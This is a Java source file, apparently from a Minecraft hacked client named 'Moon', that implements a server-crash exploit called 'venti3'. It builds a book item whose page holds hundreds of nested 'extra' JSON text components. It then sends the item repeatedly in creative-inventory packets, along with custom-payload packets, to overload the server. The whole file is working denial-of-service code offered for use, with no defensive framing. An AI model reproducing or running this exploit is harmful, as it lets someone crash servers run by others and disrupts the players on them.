package Moon.methods.impl;

import Moon.helpers.ChatHelper;
import Moon.methods.Crash;
import Moon.methods.CrashInfo;
import Moon.mods.notifications.Notification;
import Moon.mods.notifications.NotificationManager;
import Moon.mods.notifications.NotificationType;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;

@CrashInfo(
        name = "venti3"
)
public class CrashVenti3 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Moon"), "Venti crasher started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));
        (new Thread(() -> {
            for (int c = 0; c < packets; c++) {
                NBTTagCompound tag = new NBTTagCompound();
                NBTTagList list = new NBTTagList();
                StringBuilder value = new StringBuilder();
                value.append("{");
                int bvalue = 833;

                int i2;
                for (i2 = 0; i2 < bvalue; ++i2) {
                    value.append("extra:[{");
                }

                for (i2 = 0; i2 < bvalue; ++i2) {
                    value.append("text:\uFDFD}],");
                }
                value.append("text:\uFDFD}");
                list.appendTag(new NBTTagString(value.toString()));
                tag.setString("author", Minecraft.getMinecraft().getSession().getUsername());
                tag.setString("title", "Moon");
                tag.setByte("resolved", (byte) 1);
                tag.setTag("pages", list);
                ItemStack stack = new ItemStack(Items.writable_book);
                stack.setTagCompound(tag);
                PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
                pb.writeItemStackToBuffer(stack);
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload("MC|MoonLOL", (new PacketBuffer(Unpooled.buffer())).writeString("MoonWasThere")));
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C10PacketCreativeInventoryAction(3, stack));
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}